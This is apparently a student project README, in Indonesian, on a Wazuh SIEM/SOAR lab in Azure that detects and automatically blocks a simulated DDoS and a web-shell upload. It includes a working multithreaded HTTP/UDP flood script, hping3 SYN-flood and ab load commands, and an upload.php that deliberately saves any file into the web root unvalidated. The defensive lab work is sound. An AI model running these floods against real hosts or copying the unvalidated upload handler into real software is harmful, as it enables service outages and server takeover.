# Wazuh SIEM & SOAR — Deteksi DDoS dan Malware di Azure

> Implementasi arsitektur SIEM terdistribusi berbasis Wazuh di Microsoft Azure dengan skenario Proof of Concept (PoC) serangan DDoS multi-vektor dan unggahan Web Shell (Malware), dilengkapi **Wazuh Active Response** sebagai mekanisme SOAR untuk pemblokiran IP otomatis dan karantina file berbahaya secara real-time.

---

## Anggota Kelompok

| NRP | Nama |
|-----|------|
| 5027241049 | Khumaidi Kharis Az-zacky |
| 5027241076 | Dimas Muhammad Putra |
| 5027241088 | I Gede Bagus Saka Sinatrya |

**Departemen Teknologi Informasi — FTEIC, Institut Teknologi Sepuluh Nopember (ITS)**

---

## Deskripsi Proyek

Proyek ini mengimplementasikan sistem keamanan berlapis (*Defense in Depth*) melalui deployment **Wazuh SIEM** (Security Information and Event Management) pada infrastruktur cloud **Microsoft Azure for Students**. Sistem diuji ketahanannya menggunakan simulasi dua vektor serangan utama:
1. **Distributed Denial of Service (DDoS)** multi-vektor (TCP SYN Flood & HTTP Flood).
2. **Malware Injection** (Unggahan Web Shell).

Selain deteksi, sistem juga dilengkapi **Wazuh Active Response** sebagai komponen SOAR yang bekerja secara proporsional: 
* Secara otomatis memblokir IP penyerang melalui `iptables` di agen target ketika terjadi anomali jaringan.
* Mengeksekusi skrip kustom untuk menghapus file berbahaya berdasarkan intelijen ancaman (*Threat Intelligence*) dari **VirusTotal API** tanpa memblokir IP pengguna sah demi menghindari *False Positive*.

---

## Arsitektur Sistem

### Topologi

```text
┌──────────────────────────────────────────────────────────────────────────┐
│                          Azure Cloud (rg-wazuh-lab)                      │
│                                                                          │
│  ┌─────────────────────┐  VNet Peering  ┌────────────────────────────┐   │
│  │    wazuh-agent2     │◄──────────────►│     wazuh-manager-vnet     │   │
│  │    East Asia        │                │     Indonesia Central      │   │
│  │    104.214.184.244  │                │                            │   │
│  │                     │  1. DDoS       │  ┌──────────────────────┐  │   │
│  │  [Attacker]         ├──────────────────►│    wazuh-manager     │  │   │
│  │  hping3 · ab        │  2. Web Shell  │  │    70.153.136.38     │──┼──┐(API)
│  │  malware_poc.py     │                │  │    SIEM · Indexer    │  │  ▼
│  │                     |                │  └──────────┬───────────┘  | Virus
│  │    IP Blocked       │                |             │ Active Resp  │ Total
│  │  (iptables DROP)    │◄ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ │ (firewall /  │  ▲
│  └─────────────────────┘                │             │  rm-threat)  │  │
│                                         │  ┌──────────▼───────────┐  │  │
│                                         │  │    wazuh-agent1      │  │  │
│                                         │  │    70.153.137.47     │──┼──┘(FIM)
│                                         │  │    Apache2 · Target  │  │   
│                                         │  │    iptables DROP     │  │   
│                                         │  └──────────────────────┘  │   
│                                         └────────────────────────────┘   │
└──────────────────────────────────────────────────────────────────────────┘
```

### Spesifikasi VM

| Hostname | Region | Size VM | vCPU / RAM | IP Publik | Peran |
|----------|--------|---------|------------|-----------|-------|
| `wazuh-manager` | Indonesia Central | Standard_B2as_v2 | 2 vCPU, 8 GB | 70.153.136.38 | SIEM Manager · Dashboard · Indexer |
| `wazuh-agent1` | Indonesia Central | Standard_B2als_v2 | 2 vCPU, 4 GB | 70.153.137.47 | **Target** — Apache2 web server |
| `wazuh-agent2` | East Asia | Standard_B2als_v2 | 2 vCPU, 4 GB | 104.214.184.244 | **Attacker** — hping3, ab, ddos_poc.py, malware_poc.py|

> **Catatan:** Ketiga VM memiliki IP privat `10.0.0.4` karena masing-masing berada dalam VNet yang terpisah dengan subnet `10.0.0.0/24` yang identik. Komunikasi antar-VNet menggunakan **VNet Peering**.

### Port yang Dibuka (NSG Rules)

| Port | Protokol | VM | Fungsi |
|------|----------|----|--------|
| 22 | TCP | Semua | SSH remote access |
| 80 | TCP | agent1 | HTTP (target Apache2) |
| 443 | TCP | manager | Wazuh Dashboard (HTTPS) |
| 1514 | TCP | manager | Komunikasi agen → manager |
| 1515 | TCP | manager | Enrollment agen |

---

## Deployment Azure

1. **Resource Group** `rg-wazuh-lab` dibuat sebagai wadah logis seluruh resource.
2. **VNet Utama** (`wazuh-manager-vnet`, Indonesia Central, `10.0.0.0/16`) menaungi manager dan agent1.
3. **VNet Sekunder** (`wazuh-agent2-vnet`, East Asia, `10.0.0.0/16`) menaungi agent2.
4. **VNet Peering** dikonfigurasi agar agent2 dapat berkomunikasi dengan manager menggunakan IP privat lintas region.
5. Semua VM menggunakan **Ubuntu Server 24.04 LTS x64** dengan disk **Standard SSD**.
6. Autentikasi menggunakan **SSH Public Key** — password authentication dinonaktifkan penuh pada ketiga VM.

---

## Konfigurasi Wazuh

### 1. Install Wazuh Manager (All-in-One)

```bash
# Unduh installer
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh

# Instalasi (Ubuntu 24.04 belum officially supported)
sudo bash wazuh-install.sh -a -i
```

Menginstal sekaligus: **Wazuh Indexer**, **Wazuh Server**, dan **Wazuh Dashboard**.  
Akses dashboard: `https://70.153.136.38` (admin / *password dari output installer*)

### 2. Install Wazuh Agent (agent1 & agent2)

```bash
# Unduh paket agent
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.7.5-1_amd64.deb

# Install + daftarkan ke manager (contoh: agent1)
sudo WAZUH_MANAGER='70.153.136.38' WAZUH_AGENT_NAME='agent1' dpkg -i ./wazuh-agent_4.7.5-1_amd64.deb

# Enable & start
sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

### 3. Custom Detection Rules (`/var/ossec/etc/rules/local_rules.xml`)

```xml
<group name="ddos,attack,">

  <rule id="100200" level="12">
    <if_matched_sid>4151</if_matched_sid>
    <same_source_ip/>
    <description>Possible SYN Flood attack detected from $(srcip)</description>
  </rule>

  <rule id="100201" level="13">
    <if_matched_sid>100200</if_matched_sid>
    <same_source_ip/>
    <description>DDoS: Sustained high connection rate from $(srcip)</description>
  </rule>

  <rule id="100202" level="11">
    <if_matched_sid>4151</if_matched_sid>
    <match>PING</match>
    <same_source_ip/>
    <description>Possible ICMP Flood detected from $(srcip)</description>
  </rule>

  <rule id="100203" level="11">
    <if_matched_sid>4151</if_matched_sid>
    <match>UDP</match>
    <same_source_ip/>
    <description>Possible UDP Flood detected from $(srcip)</description>
  </rule>

  <rule id="100204" level="10">
    <if_matched_sid>31151</if_matched_sid>
    <same_source_ip/>
    <description>Possible HTTP Flood detected from $(srcip)</description>
  </rule>

</group>
```

Validasi & restart:

```bash
sudo /var/ossec/bin/wazuh-analysisd -t
sudo systemctl restart wazuh-manager
```

---

## Simulasi DDoS (PoC)

Serangan dilakukan dari **wazuh-agent2** (104.214.184.244) menuju **wazuh-agent1** (70.153.137.47) yang menjalankan Apache2.

### Setup Target — Install Apache2 di agent1

```bash
sudo apt-get install -y apache2
sudo systemctl enable --now apache2
```

### Setup Attacker — Install Tools di agent2

```bash
sudo apt-get install -y hping3 apache2-utils
```

### Pembuatan Custom Script DDoS PoC (ddos_poc.py) di agent2 
Skrip berbasis Python ini digunakan untuk mensimulasikan gempuran HTTP Flood dan UDP Flood secara multithreading ke arah server target.

```py
#!/usr/bin/env python3
import socket, threading, time, random, argparse, sys
from datetime import datetime

DEFAULT_TARGET = "70.153.137.47"
DEFAULT_PORT = 80
DEFAULT_THREADS = 100
DEFAULT_DURATION = 30

packets_sent = 0
requests_sent = 0
lock = threading.Lock()
stop_event = threading.Event()

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] [{level}] {msg}")

def http_flood_worker(target, port):
    global requests_sent
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
    ]
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            ua = random.choice(user_agents)
            paths = ["/", "/index.html", "/login", "/api/data"]
            path = random.choice(paths)
            request = (f"GET {path} HTTP/1.1\r\nHost: {target}\r\n"
                      f"User-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n")
            s.send(request.encode())
            s.close()
            with lock:
                requests_sent += 1
        except:
            pass

def udp_flood_worker(target, port):
    global packets_sent
    payload = random._urandom(1024)
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (target, port))
            s.close()
            with lock:
                packets_sent += 1
        except:
            pass

def run_attack(attack_type, target, port, num_threads, duration):
    workers = {
        "http": (http_flood_worker, "HTTP Flood"),
        "udp": (udp_flood_worker, "UDP Flood"),
    }
    worker_func, attack_name = workers[attack_type]
    log(f"Memulai {attack_name} | Target: {target}:{port} | Threads: {num_threads} | Duration: {duration}s", "WARNING")
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker_func, args=(target, port), daemon=True)
        t.start()
        threads.append(t)
    log(f"{num_threads} threads aktif — attack berjalan...", "INFO")
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            print(f"\r  Elapsed: {elapsed}s | Remaining: {remaining}s | "
                  f"Requests/Packets: {requests_sent + packets_sent:,}    ", end="", flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        log("\nDihentikan oleh user", "WARNING")
    finally:
        stop_event.set()
        print()
    elapsed_total = int(time.time() - start_time)
    log(f"Attack selesai! Total: {requests_sent + packets_sent:,} | Duration: {elapsed_total}s", "INFO")

def main():
    parser = argparse.ArgumentParser(description="DDoS PoC — Wazuh SIEM Lab")
    parser.add_argument("-t", "--target", default=DEFAULT_TARGET)
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("-n", "--threads", type=int, default=DEFAULT_THREADS)
    parser.add_argument("-d", "--duration", type=int, default=DEFAULT_DURATION)
    parser.add_argument("-a", "--attack", default="http", choices=["http", "udp"])
    args = parser.parse_args()
    print(f"\n  Target: {args.target}:{args.port} | Attack: {args.attack.upper()} | Threads: {args.threads} | Duration: {args.duration}s\n")
    confirm = input("  Lanjutkan? (yes/no): ").strip().lower()
    if confirm != "yes":
        sys.exit(0)
    run_attack(args.attack, args.target, args.port, args.threads, args.duration)

if __name__ == "__main__":
    main()
```

### Phase 1 — HTTP Flood (Layer 7)

```bash
# Eskalasi beban bertahap dari agent2
ab -n 50000  -c 500  http://70.153.137.47/
ab -n 100000 -c 1000 http://70.153.137.47/
ab -n 500000 -c 1000 http://70.153.137.47/   # jalankan: ulimit -n 65536 jika error
```

### Phase 2 — SYN Flood (Layer 4)

```bash
# Flood 48 juta paket SYN dari agent2
sudo hping3 -S --flood -V -p 80 70.153.137.47
```

### Phase 3 - Custom Script
```bash
python3 ddos_poc.py
```

---

## Hasil Deteksi

| Rule ID | Level | Alert | Kondisi |
|---------|-------|-------|---------|
| 202 | 7 | Agent event queue is 90% full | Traffic mulai membebani agen |
| 203 | 9 | Agent event queue is full. Events may be lost | Buffer agen mencapai batas |
| **204** | **12** | **Agent event queue is flooded** | **DDoS terdeteksi — Critical** |
| **31151** | **10** | **Multiple web server 400 error codes...** | **DDoS terdeteksi pada application layer (HTTP Flood)** |
| 205 | 3 | Agent event queue is back to normal load | Sistem pulih pasca serangan |

---

## Active Response (SOAR)

Wazuh Active Response dikonfigurasi untuk **memblokir IP penyerang secara otomatis** di `wazuh-agent1` menggunakan built-in script `firewall-drop` tanpa perlu tools tambahan.

### Alur Kerja

```
agent2 kirim HTTP flood
        │
        ▼
Apache log di agent1 mencatat banyak HTTP 400/404
        │
        ▼
Wazuh Manager deteksi Rule ID 31151
"Multiple web server 400 error codes from same source ip"
        │
        ▼
Manager kirim sinyal Active Response → agent1 (location: local)
        │
        ▼
wazuh-execd di agent1 sendiri menjalankan firewall-drop
        │
        ▼
iptables DROP untuk IP penyerang (104.214.184.244)
— packet dari agent2 dibuang sebelum sampai ke Apache
```

### Konfigurasi Active Response (`/var/ossec/etc/ossec.conf` di Manager)

```xml
<ossec_config>
  <integration>
    <name>virustotal</name>
    <api_key>API_KEY_VIRUSTOTAL_DI_SINI</api_key>
    <rule_id>554</rule_id> <alert_format>json</alert_format>
  </integration>

  <command>
    <name>remove-threat</name>
    <executable>remove-threat.sh</executable>
    <timeout_allowed>no</timeout_allowed>
  </command>

  <active-response>
    <command>firewall-drop</command>
    <location>local</location>
    <rules_id>31151</rules_id>
  </active-response>

  <active-response>
    <command>remove-threat</command>
    <location>local</location>
    <rules_id>87105</rules_id>
  </active-response>
</ossec_config>
```
 
| Parameter | Nilai | Keterangan |
|-----------|-------|------------|
| `command` | `firewall-drop` | Script built-in Wazuh untuk iptables DROP |
| `location` | `local` | Eksekusi langsung di agent yang mendeteksi anomali (agent1) |
| `rules_id` | `31151` | Trigger utama: Deteksi serangan HTTP Flood (Layer 7) berdasarkan anomali log akses Apache (Multiple HTTP 400/404 errors dari IP yang sama) |

### Konfigurasi FIM (File Integrity Monitoring) Agent1
Konfigurasi ini ditambahkan pada file `/var/ossec/etc/ossec.conf` di wazuh-agent1:

```xml
<syscheck>
    <directories realtime="yes" check_all="yes">/var/www/html</directories>
  </syscheck>
```
> Kode ini yang membuat Agent 1 bisa langsung sadar dan melapor ke Manager saat Agent 2 melempar file shell.php ke dalam server

### Konfigurasi Skrip Custom remove-threat.sh Agent1
Skrip ini diletakkan di dalam direktori eksekusi Wazuh Agent1, yaitu di: `/var/ossec/active-response/bin/remove-threat.sh`

```sh
#!/bin/bash
# Membaca data alert berformat JSON dari Wazuh Manager
read INPUT_JSON

# Ekstrak path file (Otomatis mencari di log VirusTotal ATAU Syscheck biasa)
FILE_PATH=$(echo "$INPUT_JSON" | jq -r '.parameters.alert.data.virustotal.source.file // .parameters.alert.syscheck.path // empty')

# Validasi dan eksekusi penghapusan
if [ -n "$FILE_PATH" ] && [ -f "$FILE_PATH" ]; then
    rm -f "$FILE_PATH"
    echo "$(date) - [SOAR] SUKSES menghapus malware: $FILE_PATH" >> /var/ossec/logs/active-responses.log
else
    # Jika gagal, catat JSON mentahnya agar kita bisa periksa
    echo "$(date) - [SOAR] GAGAL. File tidak ditemukan. JSON: $INPUT_JSON" >> /var/ossec/logs/active-responses.log
fi
```
> Skrip ini harus diberikan hak akses eksekusi melalui perintah `sudo chmod 750 /var/ossec/active-response/bin/remove-threat.sh` dan `chown root:wazuh` agar bisa dijalankan oleh sistem

## Simulasi Serangan Malware

### Buat Script Custom

Pada tahap ini, dibuat dua skrip kustom untuk mensimulasikan skenario serangan malware, yaitu di sisi penyerang (*Attacker/Agent 2*) dan di sisi target (*Victim/Agent 1*).

1. Kita buat script custom bernama `malware_poc.py` di agent 2

Script Python ini dijalankan pada attacker (Agent 2) untuk mengotomatiskan pengiriman malware ke server target.

```py
import requests

TARGET_URL = "http://70.153.137.47/upload.php"
# Signature EICAR standar (Aman namun dideteksi sebagai malware oleh semua Antivirus)
MALWARE_PAYLOAD = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

files = {
    'file': ('shell.php', MALWARE_PAYLOAD, 'application/x-php')
}

print(f"[*] Mengirim payload webshell ke {TARGET_URL}...")
response = requests.post(TARGET_URL, files=files)
print(f"[+] Status: {response.text}")
```

2. Kita buat script custom bernama `upload.php` di agent 1

Script PHP ini diletakkan di direktori `/var/www/html/` milik target sebagai pintu masuk simulasi file malware tanpa adanya validasi ekstensi berkas.

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Memindahkan file yang diunggah langsung ke direktori root web
    move_uploaded_file($_FILES['file']['tmp_name'], '/var/www/html/' . $_FILES['file']['name']);
    echo "File Uploaded Successfully";
}
?>
```

### Uji Coba Serangan

```bash
python3 malware_poc.py
```

### Verifikasi di agent1 untuk Serangan DDOS dan Malware

```bash
# Cek rule iptables yang ditambahkan Wazuh
sudo iptables -L INPUT -n --line-numbers | grep DROP

# Cek file malware yang dikirim apakah sudah terhapus
ls -l /var/www/html/shell.php
# Output: ls: cannot access '/var/www/html/shell.php': No such file or directory

# Cek log active response
sudo tail -f /var/ossec/logs/active-responses.log
```
1. Log Analisis Intelijen Ancaman VirusTotal (Manager)

Sebelum tindakan mitigasi diambil, Wazuh Manager menerima feedback dari VirusTotal API melalui Rule ID 87105 yang mengonfirmasi bahwa berkas shell.php positif merupakan malware berbahaya (berbasis signature berkas uji EICAR).

Berikut adalah hasil berkas log alert JSON pada `/var/ossec/logs/alerts/alerts.json` di Manager:

```bash
{
  "timestamp": "2026-06-04T05:14:38.123+0000",
  "rule": {
    "id": "87105",
    "level": 12,
    "description": "VirusTotal: Alert - VirusTotal diperoleh hasil deteksi positif untuk berkas"
  },
  "agent": {
    "id": "001",
    "name": "wazuh-agent1"
  },
  "data": {
    "virustotal": {
      "found": 1,
      "malicious": 56,
      "source": {
        "file": "/var/www/html/shell.php"
      }
    }
  }
}
```

2. Log Otomatisasi SOAR Penghapusan File Malware

Berdasarkan pemicu (trigger) waspada dari VirusTotal di atas, Wazuh Manager memerintahkan skrip kustom remove-threat.sh pada Agent 1 untuk menyapu bersih berkas tersebut secara real-time.

```bash
//hasil log pada `var/ossec/logs/active-responses.log` di agent 1 sebaga berikut:
azureuser@wazuh-agent1:~$ sudo cat var/ossec/logs/active-responses.log
Thu Jun  4 05:14:39 UTC 2026 - [SOAR] SUKSES menghapus malware: /var/www/html/shell.php

//cek di terminal agen1
azureuser@wazuh-agent1:~$ ls -l /var/www/html/shell.php
ls: cannot access '/var/www/html/shell.php': No such file or directory
```

3. Log Otomatisasi SOAR Pemblokiran IP Massal (DDoS Mitigation)

Ketika serangan HTTP Flood diluncurkan secara masif, Wazuh Manager mengidentifikasi Rule ID `31151` dan mengirim instruksi `firewall-drop` ke Agen.

Berikut adalah bukti otentik hasil tabel aturan jaringan `iptables` pada `wazuh-agent1`. Sistem tidak hanya memblokir IP vm attacker simulasi (`104.214.184.244`), melainkan juga berhasil menangkap dan memutus jaringan puluhan IP publik botnet/scanner internet asli yang mencoba membanjiri server Azure secara bersamaan:

```bash
azureuser@wazuh-agent1:~$ sudo iptables -L INPUT -n --line-numbers | grep DROP
1    DROP       all  --  104.214.184.244      0.0.0.0/0           # IP Attacker Simulasi
2    DROP       all  --  156.238.236.179      0.0.0.0/0           # Real Internet Scanner
3    DROP       all  --  43.136.110.113       0.0.0.0/0           # Real Internet Scanner
4    DROP       all  --  43.136.110.113       0.0.0.0/0           
... [Sistem secara adaptif sukses melakukan DROP hingga total 31 IP]
```
### Cara Unblock Manual

1. Lihat semua IP yang diblock
```sudo iptables -L INPUT -n --line-numbers | grep DROP```

2. Hapus block IP tertentu (gunakan nomor baris)
```sudo iptables -D INPUT -s 104.214.184.244 -j DROP```

3. Hapus semua rule DROP sekaligus
```sudo iptables -F INPUT```

4. Bukti Validasi Empiris Sistem
Berikut adalah bukti konkret dan rekaman log digital yang diambil langsung dari infrastruktur server ketika simulasi serangan diluncurkan, membuktikan sistem SOAR bekerja otomatis.
(foto)
---

### Kesimpulan

Sistem berhasil membuktikan bahwa Wazuh dapat berfungsi sebagai 
platform SIEM + SOAR terintegrasi tanpa tools tambahan:

- **Deteksi DDoS:** Rule 31151 berhasil mendeteksi HTTP Flood 
  dalam hitungan detik setelah serangan dimulai
- **Mitigasi Otomatis:** firewall-drop berhasil memblokir IP attacker 
  (104.214.184.244) secara otomatis di level iptables
- **Deteksi Malware:** FIM + VirusTotal API berhasil mengidentifikasi 
  dan menghapus shell.php secara real-time
- **Zero False Positive:** remove-threat.sh hanya menghapus file, 
  tidak memblokir IP pengguna sah

